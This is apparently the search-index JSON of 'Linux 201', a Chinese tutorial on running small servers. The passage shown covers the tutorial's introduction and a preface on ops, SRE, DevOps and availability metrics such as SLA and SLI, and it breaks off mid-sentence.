{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"Linux 201 \u200b\u8fdb\u9636\u200b\u6559\u7a0b","text":"<p>\u200b\u6b22\u8fce\u200b\u6765\u5230\u200b Linux 201 \u200b\u8fdb\u9636\u200b\u6559\u7a0b\u200b</p> <p>\u200b\u4f5c\u4e3a\u200b Linux 101 \u200b\u7684\u200b\u8fdb\u9636\u200b\u7248\u200b\uff0c\u200b\u672c\u200b\u6559\u7a0b\u200b\u4e3b\u8981\u200b\u9762\u5411\u200b\u9700\u8981\u200b\u4e86\u89e3\u200b\u5982\u4f55\u200b\u8fd0\u7ef4\u200b\u5c11\u91cf\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u7528\u6237\u200b\uff0c\u200b\u7279\u522b\u200b\u662f\u200b\u548c\u200b\u7f16\u8005\u200b\u4eec\u200b\u4e00\u6837\u200b\u7684\u200b\u5b66\u751f\u200b\u8fd0\u7ef4\u200b\uff0c\u200b\u56e0\u6b64\u200b\u548c\u200b\u5176\u4ed6\u200b\u7684\u200b\u6559\u7a0b\u200b\u5728\u200b\u7f16\u5199\u200b\u98ce\u683c\u200b\u7b49\u200b\u65b9\u9762\u200b\u5b58\u5728\u200b\u4e0d\u540c\u200b\u3002Linux 201 \u200b\u91c7\u53d6\u200b\u4ee5\u4e0b\u200b\u7684\u200b\u7f16\u5199\u200b\u539f\u5219\u200b\uff1a</p> <ul> <li>Debian First\uff1aDebian \u200b\u662f\u200b\u975e\u5e38\u200b\u7a33\u5b9a\u200b\u53ef\u9760\u200b\u7684\u200b\u793e\u533a\u200b Linux \u200b\u53d1\u884c\u7248\u200b\uff0c\u200b\u540c\u65f6\u200b USTCLUG \u200b\u6240\u6709\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u90fd\u200b\u8fd0\u884c\u200b Debian\uff0c\u200b\u56e0\u6b64\u200b\u672c\u200b\u6559\u7a0b\u200b\u4ee5\u200b Debian \u200b\u4f5c\u4e3a\u200b\u4e3b\u8981\u200b\u53c2\u8003\u200b\u53d1\u884c\u7248\u200b\u3002\u200b\u5f53\u7136\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u53d1\u884c\u7248\u200b\u4e5f\u200b\u4f1a\u200b\u6709\u6240\u200b\u6d89\u53ca\u200b\u3002</li> <li>Linux 201 \u200b\u4e0d\u662f\u200b\u624b\u518c\u200b\u7684\u200b\u590d\u8bfb\u673a\u200b\uff1a\u200b\u672c\u200b\u6559\u7a0b\u200b\u4e0d\u4f1a\u200b\u8be6\u7ec6\u200b\u4ecb\u7ecd\u200b\u6240\u6709\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u7ec6\u8282\u200b\u3002\u200b\u4f5c\u4e3a\u200b\u4e00\u9879\u200b\u9884\u671f\u200b\u8981\u6c42\u200b\uff0c\u200b\u8bfb\u8005\u200b\u5e94\u5f53\u200b\u80fd\u591f\u200b\u719f\u7ec3\u200b\u67e5\u8be2\u200b\u6240\u200b\u9700\u200b\u4f7f\u7528\u200b\u7684\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u6587\u6863\u200b\u4e0e\u200b\u624b\u518c\u200b\u3002</li> <li>\u200b\u77e5\u5176\u7136\u200b\uff0c\u200b\u77e5\u5176\u6240\u4ee5\u7136\u200b\uff1a\u200b\u6211\u4eec\u200b\u4f1a\u200b\u5c3d\u91cf\u200b\u89e3\u91ca\u200b\u4e3a\u4ec0\u4e48\u200b\u8981\u200b\u505a\u200b\u67d0\u4ef6\u4e8b\u200b\u60c5\u200b\uff0c\u200b\u5176\u200b\u5e95\u5c42\u200b\u903b\u8f91\u200b\u662f\u200b\u600e\u6837\u200b\u7684\u200b\uff0c\u200b\u800c\u200b\u4e0d\u4ec5\u4ec5\u200b\u662f\u200b\u600e\u4e48\u200b\u505a\u200b\u3002\u200b\u6211\u4eec\u200b\u5e0c\u671b\u200b\u8bfb\u8005\u200b\u80fd\u591f\u200b\u7406\u89e3\u200b\u80cc\u540e\u200b\u7684\u200b\u539f\u7406\u200b\uff0c\u200b\u800c\u200b\u4e0d\u4ec5\u4ec5\u200b\u662f\u200b\u673a\u68b0\u200b\u5730\u200b\u64cd\u4f5c\u200b\u3002\uff08\u200b\u51b5\u4e14\u200b\uff0c\u200b\u4e86\u89e3\u200b\u5e95\u5c42\u200b\u7684\u200b\u8fd0\u884c\u200b\u89c4\u5f8b\u200b\uff0c\u200b\u4e5f\u200b\u662f\u200b\u4e00\u4ef6\u200b\u5f88\u200b\u6709\u8da3\u200b\u7684\u200b\u4e8b\u60c5\u200b\uff01\uff09</li> <li>\u200b\u53d6\u81ea\u200b\u5b9e\u8df5\u200b\uff0c\u200b\u9f13\u52b1\u200b\u5b9e\u8df5\u200b\uff1a\u200b\u672c\u200b\u6559\u7a0b\u200b\u7684\u200b\u5185\u5bb9\u200b\u5927\u591a\u200b\u53d6\u81ea\u200b\u6211\u4eec\u200b\u7684\u200b\u5b9e\u9645\u200b\u8fd0\u7ef4\u200b\u7ecf\u9a8c\u200b\uff0c\u200b\u800c\u200b\u975e\u200b\u7a7a\u8c08\u200b\u3002\u200b\u5e76\u4e14\u200b\uff0c\u200b\u672c\u200b\u6559\u7a0b\u200b\u4e5f\u200b\u5e0c\u671b\u200b\u8bfb\u8005\u200b\u80fd\u591f\u200b\u5728\u200b\u9605\u8bfb\u200b\u7684\u200b\u540c\u65f6\u200b\u52a8\u624b\u200b\uff0c\u200b\u5728\u200b\u81ea\u5df1\u200b\u7684\u200b\u73af\u5883\u200b\u4e2d\u200b\u5c1d\u8bd5\u200b\u3002</li> </ul> <p>\u200b\u6211\u4eec\u200b\u5bf9\u200b\u8bfb\u8005\u200b\u7684\u200b\u9884\u671f\u200b\u8981\u6c42\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li>\u200b\u80fd\u591f\u200b\u76f8\u5bf9\u200b\u719f\u7ec3\u5730\u200b\u4f7f\u7528\u200b C \u200b\u548c\u200b Python \u200b\u8bed\u8a00\u200b\u7f16\u5199\u200b\u81ea\u5df1\u200b\u6240\u200b\u9700\u200b\u7684\u200b\u7a0b\u5e8f\u200b\u3002</li> <li>\u200b\u4e86\u89e3\u200b Linux 101 \u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5e76\u4e14\u200b\u6709\u200b\u80fd\u529b\u200b\u5b8c\u6210\u200b\u5176\u4e2d\u200b\u7684\u200b\u7ec3\u4e60\u200b\u3002</li> <li>\u200b\u6709\u200b\u80fd\u529b\u200b\u914d\u7f6e\u200b\u53ef\u7528\u200b\u7684\u200b Debian \u200b\u7cfb\u7edf\u200b\u73af\u5883\u200b\uff08\u200b\u7269\u7406\u200b\u673a\u200b/\u200b\u865a\u62df\u673a\u200b/\u200b\u5bb9\u5668\u200b\u7b49\u200b\uff09\u3002</li> <li>\u200b\u80fd\u591f\u200b\u6b63\u786e\u200b\u4f7f\u7528\u200b Google \u200b\u7b49\u200b\u641c\u7d22\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u5e76\u200b\u76f8\u5bf9\u200b\u719f\u7ec3\u5730\u200b\u9605\u8bfb\u200b\u82f1\u6587\u200b\u8d44\u6599\u200b\u3002</li> </ul> <p>\u200b\u9664\u6b64\u4e4b\u5916\u200b\uff0c\u200b\u90e8\u5206\u200b\u7ae0\u8282\u200b\u53ef\u80fd\u200b\u4f9d\u8d56\u4e8e\u200b\u5176\u4ed6\u200b\u8ba1\u7b97\u673a\u79d1\u5b66\u200b\u7684\u200b\u77e5\u8bc6\u200b\uff0c\u200b\u4f8b\u5982\u200b\u6570\u636e\u5e93\u200b\u3001\u200b\u8ba1\u7b97\u673a\u7f51\u7edc\u200b\u7b49\u200b\u3002\u200b\u5982\u679c\u200b\u5bf9\u200b\u524d\u7f6e\u200b\u8981\u6c42\u200b\u4e0d\u200b\u719f\u6089\u200b\uff0c\u200b\u5efa\u8bae\u200b\u5148\u200b\u5b66\u4e60\u200b\u76f8\u5173\u200b\u7684\u200b\u77e5\u8bc6\u200b\u3002\u200b\u4f5c\u4e3a\u200b\u53c2\u8003\u200b\uff0ccs-self-learning \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e0d\u9519\u200b\u7684\u200b\u81ea\u5b66\u200b\u6559\u7a0b\u200b\u76ee\u5f55\u200b\u3002</p> <p>\u200b\u672c\u200b\u6559\u7a0b\u200b\u5206\u4e3a\u200b\u4e24\u200b\u5927\u90e8\u5206\u200b\uff1a\u200b\u8fd0\u7ef4\u200b\u57fa\u7840\u200b\u4e0e\u200b\u5f00\u53d1\u200b\u901f\u67e5\u200b\u624b\u518c\u200b\uff0c\u200b\u5206\u522b\u200b\u4ecb\u7ecd\u200b\u7cfb\u7edf\u200b\u8fd0\u7ef4\u200b\uff08ops\uff09\u200b\u548c\u200b\u7b80\u5355\u200b\u7684\u200b\u5f00\u53d1\u200b\uff08dev\uff09\u200b\u4e24\u4e2a\u200b\u65b9\u9762\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002\u200b\u5176\u4ed6\u200b\u8f83\u4e3a\u200b\u4e0d\u200b\u5e38\u89c1\u200b\uff0c\u200b\u6216\u200b\u4e0d\u591f\u200b\u6210\u719f\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5728\u200b\u9ad8\u7ea7\u200b\u5185\u5bb9\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u3002</p> <p>\u200b\u672c\u200b\u6559\u7a0b\u200b\u4f7f\u7528\u200b CC BY-NC-SA 4.0 \u200b\u534f\u8bae\u200b\u5f00\u653e\u200b\u3002\u200b\u8bf7\u200b\u6ce8\u610f\u200b\uff0c\u200b\u4e0e\u200b Linux 101 \u200b\u76f8\u6bd4\u200b\uff0c\u200b\u6211\u4eec\u200b\u6dfb\u52a0\u200b\u4e86\u200b\u300c\u200b\u7981\u6b62\u200b\u5546\u7528\u200b\u300d\u200b\u7684\u200b\u6761\u6b3e\u200b\u3002</p> <p>\u200b\u6211\u4eec\u200b\u975e\u5e38\u200b\u6b22\u8fce\u200b\u8bfb\u8005\u200b\u901a\u8fc7\u200b GitHub \u200b\u4ed3\u5e93\u200b \u200b\u63d0\u4ea4\u200b issue\uff0c\u200b\u6216\u200b\u90ae\u4ef6\u200b\u81f4\u4fe1\u200b\u3002\u200b\u8bfb\u8005\u200b\u7684\u200b\u5efa\u8bae\u200b\u5bf9\u200b\u6211\u4eec\u200b\u7684\u200b\u6539\u8fdb\u200b\u975e\u5e38\u200b\u91cd\u8981\u200b\u3002</p>"},{"location":"preface/","title":"\u5e8f\u8a00","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@taoky</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u5982\u679c\u200b\u4f60\u200b\u6b63\u5728\u200b\u9605\u8bfb\u200b\u8fd9\u6bb5\u8bdd\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4f60\u200b\u53ef\u80fd\u200b\u624b\u5934\u200b\u8981\u200b\u8d1f\u8d23\u200b\u4e00\u53f0\u200b\u6216\u8005\u200b\u591a\u53f0\u200b\u670d\u52a1\u5668\u200b\u7684\u200b\u7ef4\u62a4\u200b\uff0c\u200b\u4e5f\u200b\u6709\u200b\u53ef\u80fd\u200b\u4ec5\u4ec5\u53ea\u662f\u200b\u5e0c\u671b\u200b\u80fd\u591f\u200b\u66f4\u52a0\u200b\u4e86\u89e3\u200b\u81ea\u5df1\u200b\u6b63\u5728\u200b\u4f7f\u7528\u200b\u7684\u200b\u7cfb\u7edf\u200b\u3002\u200b\u672c\u200b\u524d\u8a00\u200b\u90e8\u5206\u200b\u4f1a\u200b\u4ecb\u7ecd\u200b\u4e0e\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b\u804c\u8d23\u200b\u76f8\u5173\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5e2e\u52a9\u200b\u4f60\u200b\u5728\u200b\u9605\u8bfb\u200b\u672c\u200b\u6559\u7a0b\u200b\u7684\u200b\u5185\u5bb9\u200b\u4e4b\u524d\u200b\uff0c\u200b\u5bf9\u200b\u76f8\u5173\u200b\u6982\u5ff5\u200b\u4e0e\u200b\u81ea\u5df1\u200b\u9700\u8981\u200b\u505a\u200b\u7684\u200b\u4e8b\u60c5\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b\u8ba4\u8bc6\u200b\u3002</p>"},{"location":"preface/#sre-devops","title":"\u8fd0\u7ef4\u200b\u3001SRE \u200b\u4e0e\u200b DevOps","text":"<p>\u200b\u5f53\u200b\u6211\u4eec\u200b\u8ba8\u8bba\u200b\u300c\u200b\u7cfb\u7edf\u7ba1\u7406\u200b\u300d\u200b\u76f8\u5173\u200b\u7684\u200b\u804c\u8d23\u200b\u65f6\u200b\uff0c\u200b\u6211\u4eec\u200b\u53ef\u80fd\u200b\u7ecf\u5e38\u200b\u542c\u5230\u200b\u6807\u9898\u200b\u4e2d\u200b\u9610\u8ff0\u200b\u7684\u200b\u51e0\u4e2a\u200b\u8bcd\u200b\uff1a</p> \u200b\u8fd0\u7ef4\u200b <p>\u200b\u8fd0\u7ef4\u200b\u9700\u8981\u200b\u7ba1\u7406\u7cfb\u7edf\u200b\uff0c\u200b\u5904\u7406\u200b\u7a81\u53d1\u4e8b\u4ef6\u200b\uff0c\u200b\u90e8\u7f72\u200b\u4e1a\u52a1\u200b\u6240\u200b\u9700\u8981\u200b\u7684\u200b\u5e94\u7528\u200b\uff0c\u200b\u5e76\u4e14\u200b\u786e\u4fdd\u200b\u7cfb\u7edf\u200b\u7684\u200b\u6027\u80fd\u200b\u3001\u200b\u7a33\u5b9a\u6027\u200b\u4e0e\u200b\u5b89\u5168\u6027\u200b\u3002\u200b\u8fd0\u7ef4\u200b\u9700\u8981\u200b\u7ba1\u7406\u200b\u5305\u62ec\u200b\u670d\u52a1\u5668\u200b\u3001\u200b\u7f51\u7edc\u200b\u3001\u200b\u5b58\u50a8\u200b\u7b49\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u505a\u597d\u200b\u7cfb\u7edf\u76d1\u63a7\u200b\u3001\u200b\u5907\u4efd\u200b\u7b49\u200b\u7ef4\u62a4\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5e76\u4e14\u200b\u9700\u8981\u200b\u6709\u200b\u6545\u969c\u200b\u6392\u9664\u200b\u7684\u200b\u80fd\u529b\u200b\u3002</p> SRE (Site Reliability Engineering) <p>SRE \u200b\u662f\u200b Google \u200b\u4e8e\u200b 2003 \u200b\u5e74\u200b\u63d0\u51fa\u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u5e0c\u671b\u200b\u5c06\u200b\u8f6f\u4ef6\u5de5\u7a0b\u200b\u76f8\u5173\u200b\u7684\u200b\u65b9\u6cd5\u200b\u5e94\u7528\u200b\u5230\u200b\u7cfb\u7edf\u7ba1\u7406\u200b\u7684\u200b\u5de5\u4f5c\u200b\u4e2d\u200b\u53bb\u200b\u3002SRE \u200b\u5728\u200b\u8fd0\u7ef4\u200b\u5de5\u4f5c\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0c\u200b\u9700\u8981\u200b\u5c3d\u53ef\u80fd\u200b\u5730\u200b\u901a\u8fc7\u200b\u8f6f\u4ef6\u5f00\u53d1\u200b\u7684\u200b\u65b9\u5f0f\u200b\u6765\u200b\u5b9e\u73b0\u200b\u7cfb\u7edf\u7ba1\u7406\u200b\u7684\u200b\u81ea\u52a8\u5316\u200b\uff0c\u200b\u51cf\u5c11\u200b\u4eba\u4e3a\u200b\u5e72\u9884\u200b\uff0c\u200b\u4ece\u800c\u200b\u6784\u5efa\u200b\u53ef\u9760\u200b\u7684\u200b\u7cfb\u7edf\u200b\u3002SRE \u200b\u8fd8\u200b\u5728\u200b\u8fd0\u7ef4\u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\u5f15\u5165\u200b\u4e86\u200b\u5176\u4ed6\u200b\u7684\u200b\u6982\u5ff5\u200b\uff0c\u200b\u8bf8\u5982\u200b\u53ef\u9760\u6027\u200b\u7684\u200b\u5b9a\u4e49\u200b\u4ee5\u53ca\u200b\u8861\u91cf\u200b\u65b9\u5f0f\u200b\u7b49\u200b\u3002</p> DevOps <p>DevOps \u200b\u548c\u200b SRE \u200b\u7684\u200b\u5de5\u4f5c\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u662f\u200b\u76f8\u8fd1\u200b\u7684\u200b\uff0c\u200b\u4f46\u662f\u200b DevOps \u200b\u66f4\u52a0\u200b\u4fa7\u91cd\u4e8e\u200b\u5f00\u53d1\u200b\u4e0e\u200b\u8fd0\u7ef4\u200b\u4e4b\u95f4\u200b\u7684\u200b\u878d\u5408\u200b\uff0c\u200b\u51cf\u5c11\u200b\u4e24\u8005\u4e4b\u95f4\u200b\u7684\u200b\u6c9f\u901a\u200b\u6210\u672c\u200b\uff0c\u200b\u52a0\u5feb\u200b\u4ea7\u54c1\u200b\u7684\u200b\u5f00\u53d1\u200b\u4e0e\u200b\u8fed\u4ee3\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u5f00\u53d1\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5e0c\u671b\u200b\u80fd\u591f\u200b\u5c3d\u53ef\u80fd\u200b\u5feb\u901f\u200b\u5730\u200b\u90e8\u7f72\u200b\u81ea\u5df1\u200b\u7684\u200b\u66f4\u65b0\u200b\uff0c\u200b\u800c\u200b\u8fd0\u7ef4\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u7531\u4e8e\u200b\u7a33\u5b9a\u6027\u200b\u4e0a\u200b\u7684\u200b\u987e\u8651\u200b\u800c\u200b\u5c3d\u53ef\u80fd\u200b\u907f\u514d\u200b\u53d8\u5316\u200b\uff0c\u200b\u4f46\u200b\u901a\u8fc7\u200b CI\uff08Continuous Integration\uff0c\u200b\u6301\u7eed\u200b\u96c6\u6210\u200b\uff09\u200b\u548c\u200b CD\uff08Continuous Delivery\uff0c\u200b\u6301\u7eed\u200b\u4ea4\u4ed8\u200b\uff09\u200b\u4e0a\u200b\u7684\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u66f4\u65b0\u200b\uff08\u200b\u4ea4\u4ed8\u200b\uff09\u200b\u53ef\u4ee5\u200b\u5728\u200b\u4fdd\u8bc1\u200b\u7a33\u5b9a\u6027\u200b\u7684\u200b\u540c\u65f6\u200b\u66f4\u52a0\u200b\u5feb\u901f\u200b\u3002</p> <p>Linux 201</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\uff0cLinux 201 \u200b\u4e0d\u662f\u200b\u4e13\u95e8\u200b\u7684\u200b SRE/DevOps \u200b\u5165\u95e8\u6559\u7a0b\u200b\u3002</p>"},{"location":"preface/#_2","title":"\u53ef\u9760\u6027\u200b\u6307\u6807","text":"<p>\u200b\u5f53\u200b\u6211\u4eec\u200b\u8ba8\u8bba\u200b\u300c\u200b\u53ef\u9760\u6027\u200b\u300d\u200b\u65f6\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u53ef\u4ee5\u200b\u542c\u5230\u200b\u50cf\u200b\u300c3 \u200b\u4e2a\u200b 9\u300d\u300c4 \u200b\u4e2a\u200b 9\u300d\u200b\u8fd9\u6837\u200b\u7684\u200b\u63cf\u8ff0\u200b\uff0c\u200b\u8fd9\u200b\u4ee3\u8868\u200b\u4e86\u200b\u670d\u52a1\u200b\u6b63\u5e38\u200b\u8fd0\u884c\u200b\u7684\u200b\u65f6\u95f4\u200b\u6bd4\u4f8b\u200b\u3002\u200b\u5982\u679c\u200b\u670d\u52a1\u200b\u7684\u200b\u53ef\u9760\u6027\u200b\u6709\u200b 3 \u200b\u4e2a\u200b 9\uff0899.9%\uff09\uff0c\u200b\u90a3\u4e48\u200b\u6bcf\u5e74\u200b\u5219\u200b\u6700\u200b\u591a\u200b\u5141\u8bb8\u200b\u4e0d\u53ef\u200b\u7528\u200b 8 \u200b\u5c0f\u65f6\u200b 41 \u200b\u5206\u949f\u200b 38 \u200b\u79d2\u200b\u3002\u200b\u5982\u679c\u200b\u518d\u200b\u52a0\u200b\u4e00\u4e2a\u200b 9\uff0899.99%\uff09\uff0c\u200b\u90a3\u4e48\u200b\u6bcf\u5e74\u200b\u7684\u200b\u4e0d\u53ef\u200b\u7528\u200b\u65f6\u95f4\u6bb5\u200b\u5c31\u200b\u6700\u200b\u591a\u53ea\u200b\u5141\u8bb8\u200b 52 \u200b\u5206\u949f\u200b 9.8 \u200b\u79d2\u200b\u3002\u200b\u5728\u200b\u7b7e\u8ba2\u200b\u6cd5\u5f8b\u5408\u540c\u200b\u65f6\u200b\uff0c\u200b\u8fd9\u9879\u200b\u6307\u6807\u200b\u4e5f\u200b\u88ab\u200b\u79f0\u4e3a\u200b SLA\uff08Service Level Agreement\uff09\uff0c\u200b\u4ee3\u8868\u200b\u4e86\u200b\u670d\u52a1\u63d0\u4f9b\u5546\u200b\u548c\u200b\u5ba2\u6237\u200b\u4e4b\u95f4\u200b\u7684\u200b\u53ef\u7528\u6027\u200b\u7ea6\u5b9a\u200b\uff0c\u200b\u5982\u679c\u200b\u670d\u52a1\u200b\u6ca1\u200b\u80fd\u200b\u8fbe\u5230\u200b SLA \u200b\u7684\u200b\u8981\u6c42\u200b\uff0c\u200b\u670d\u52a1\u63d0\u4f9b\u5546\u200b\u9700\u8981\u200b\u63d0\u4f9b\u200b\u8865\u507f\u200b\u3002</p> <p><code>s/SLA/availability/g</code></p> <p>\u200b\u4e0d\u5c11\u200b\u65f6\u5019\u200b\uff0cSLA \u200b\u8fd9\u4e2a\u200b\u8bcd\u4f1a\u200b\u88ab\u200b\u8bef\u7528\u200b\u6765\u200b\u63cf\u8ff0\u200b\u67d0\u4e2a\u200b\u670d\u52a1\u200b\u7684\u200b\u300c\u200b\u53ef\u7528\u6027\u200b\u300d\uff0c\u200b\u8fd9\u200b\u901a\u5e38\u200b\u662f\u200b\u4e0d\u200b\u6b63\u786e\u200b\u7684\u200b\uff08\u200b\u9664\u975e\u200b\u4f60\u200b\u4e0e\u200b\u670d\u52a1\u63d0\u4f9b\u5546\u200b\u7b7e\u8ba2\u200b\u4e86\u200b\u6b63\u5f0f\u200b\u534f\u8bae\u200b\uff09\u3002\u200b\u7279\u522b\u200b\u662f\u200b\u5bf9\u200b\u516c\u76ca\u200b\u6027\u8d28\u200b\u7684\u200b\u7f51\u7edc\u670d\u52a1\u200b\u800c\u8a00\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u8fd9\u200b\u7c7b\u200b\u670d\u52a1\u200b\u65e0\u6cd5\u200b\u627f\u62c5\u200b\u8fdd\u7ea6\u200b\u8d54\u507f\u200b\u8d23\u4efb\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ea\u200b\u80fd\u591f\u200b\u5c3d\u529b\u800c\u4e3a\u200b\u4fdd\u969c\u200b\u53ef\u7528\u6027\u200b\uff0c\u200b\u800c\u200b\u4e0d\u80fd\u200b\u4f7f\u7528\u200b SLA \u200b\u8fd9\u79cd\u200b\u6709\u200b\u5408\u540c\u200b\u7ea6\u675f\u200b\u6548\u529b\u200b\u7684\u200b\u8bcd\u6c47\u200b\u3002</p> <p>\u200b\u66f4\u597d\u200b\u7684\u200b\u8bf4\u6cd5\u200b\u662f\u200b\u300c\u200b\u67d0\u4e2a\u200b\u670d\u52a1\u200b\u7684\u200b\u53ef\u7528\u6027\u200b\uff08uptime \u200b\u6216\u200b availability\uff09\u200b\u5728\u200b\u67d0\u5e74\u200b\u8fbe\u5230\u200b\u4e86\u200b / \u200b\u9884\u671f\u200b\u80fd\u200b\u8fbe\u5230\u200b 99.9%\u300d\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u5982\u4f55\u200b\u5b9a\u4e49\u200b\u300c\u200b\u53ef\u7528\u200b\u300d\u200b\u5462\u200b\uff1f\u200b\u8fd9\u200b\u5c31\u200b\u4e0e\u200b SLI\uff08Service Level Indicator\uff09\u200b\u6709\u5173\u200b\u4e86\u200b\u3002SLI \u200b\u662f\u200b\u7528\u6765\u200b\u8861\u91cf\u200b\u670d\u52a1\u200b\u60c5\u51b5\u200b\u7684\u200b\u5177\u4f53\u200b\u503c\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff0cHTTP \u200b\u7684\u200b\u54cd\u5e94\u200b\u65f6\u95f4\u200b\u5c31\u662f\u200b\u4e00\u79cd\u200b\u5178\u578b\u200b\u7684\u200b SLI\u3002</p> <p>\u200b\u9ad8\u4e8e\u200b\u300c3 \u200b\u4e2a\u200b 9\u300d\u200b\u7684\u200b\u53ef\u9760\u6027\u200b\u76ee\u6807\u200b\u8981\u200b\u8fbe\u5230\u200b\u4e0d\u662f\u200b\u4e00\u4ef6\u200b\u5bb9\u6613\u200b\u7684\u200b\u4e8b\u60c5\u200b\u3002\u200b\u5373\u4f7f\u200b\u5806\u200b\u5f88\u591a\u200b\u4eba\u6765\u200b\u4e09\u73ed\u5012\u200b\u5de5\u4f5c\u200b\uff0c\u200b\u8981\u200b\u8fbe\u5230\u200b\u300c4 \u200b\u4e2a\u200b 9\u300d\u200b\u7684\u200b\u6c34\u51c6\u200b\u4e5f\u200b\u4ecd\u7136\u200b\u662f\u200b\u4e00\u4ef6\u200b\u56f0\u96be\u200b\u7684\u200b\u4e8b\u60c5\u200b\u3002\u200b\u56e0\u6b64\u200b\u5728\u200b\u4f01\u4e1a\u200b\u4e2d\u200b\uff0c\u200b\u8fd0\u7ef4\u200b/SRE \u200b\u5de5\u4f5c\u200b\u4f1a\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u66f4\u52a0\u200b\u590d\u6742\u200b\uff08Linux 201 \u200b\u4e5f\u200b\u4e0d\u592a\u4f1a\u200b\u6d89\u53ca\u200b\uff09\u200b\u7684\u200b\u65b9\u5f0f\u200b\u6765\u200b\u63d0\u9ad8\u200b\u53ef\u9760\u6027\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5c3d\u53ef\u80fd\u200b\u5b9e\u73b0\u200b\u81ea\u52a8\u5316\u200b\u8fd0\u7ef4\u200b\uff0c\u200b\u51cf\u5c11\u200b\u56e0\u4e3a\u200b\u9700\u8981\u200b\u4eba\u529b\u200b\u4ecb\u5165\u200b\u5bfc\u81f4\u200b\u4e0d\u53ef\u200b\u7528\u200b\u65f6\u95f4\u200b\u589e\u957f\u200b\u7684\u200b\u95ee\u9898\u200b\uff1b\u200b\u4f7f\u7528\u200b\u5206\u5e03\u5f0f\u200b\u7684\u200b\u67b6\u6784\u200b\uff0c\u200b\u5c3d\u53ef\u80fd\u200b\u6392\u9664\u200b\u5355\u70b9\u6545\u969c\u200b\uff08Single Point of Failure\uff0cSPOF\uff09\u200b\u95ee\u9898\u200b\uff1b\u200b\u8bbe\u7f6e\u200b\u70ed\u5907\u200b\u670d\u52a1\u200b\u7b49\u7b49\u200b\u3002</p>"},{"location":"preface/#_3","title":"\u6240\u4ee5\u200b\u6211\u200b\u9700\u8981\u200b\u505a\u200b\u4ec0\u4e48\u200b\uff1f","text":"<p>\u200b\u5982\u679c\u200b\u4f60\u200b\u5e0c\u671b\u200b\u53ef\u4ee5\u200b\u5feb\u901f\u200b\u642d\u5efa\u200b\u51fa\u200b\u548c\u200b\u4e2d\u578b\u200b\u3001\u200b\u5927\u578b\u200b\u4f01\u4e1a\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u9ad8\u53ef\u9760\u6027\u200b\u7cfb\u7edf\u200b\u7684\u8bdd\u200b\uff0c\u200b\u6216\u8005\u200b\u5c3d\u53ef\u80fd\u200b\u4f7f\u7528\u200b\u4e91\u200b\u5382\u5546\u200b\u7684\u200b\u80fd\u529b\u200b\u6784\u5efa\u200b\u6574\u4f53\u200b\u7cfb\u7edf\u200b\u7684\u8bdd\u200b\uff0c\u200b\u90a3\u4e48\u200b Linux 201 \u200b\u53ef\u80fd\u200b\u4e0d\u662f\u200b\u4e00\u4e2a\u200b\u5408\u9002\u200b\u7684\u200b\u6559\u7a0b\u200b\u3002\u200b\u4f46\u662f\u200b Linux 201 \u200b\u5e76\u975e\u200b\u5bf9\u200b\u524d\u8ff0\u200b\u63d0\u5230\u200b\u7684\u200b\u5de5\u4f5c\u200b\u6ca1\u6709\u200b\u5e2e\u52a9\u200b\u2014\u2014\u200b\u6211\u4eec\u200b\u76f8\u4fe1\u200b\uff0c\u200b\u5b8c\u6574\u200b\u5730\u200b\u7406\u89e3\u200b\uff08\u200b\u76f8\u5bf9\u200b\uff09\u200b\u7b80\u5355\u200b\u3001\u200b\u5c0f\u578b\u200b\u7684\u200b\u7cfb\u7edf\u200b\uff08\u200b\u6216\u8005\u8bf4\u200b\u300c\u200b\u5355\u673a\u200b\u300d\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff09\u200b\u5185\u90e8\u200b\u7684\u200b\u5de5\u4f5c\u200b\u539f\u7406\u200b\uff0c\u200b\u662f\u200b\u7406\u89e3\u200b\u66f4\u5927\u200b\u7684\u200b\u7cfb\u7edf\u200b\u4e0d\u53ef\u6216\u7f3a\u200b\u7684\u200b\u524d\u63d0\u200b\u3002</p> <p>\u200b\u9664\u5374\u200b\u6280\u672f\u200b\u4ee5\u5916\u200b\uff0c\u200b\u4e0d\u7ba1\u200b\u662f\u200b\u7cfb\u7edf\u7ba1\u7406\u5458\u200b/\u200b\u8fd0\u7ef4\u200b/SRE/DevOps 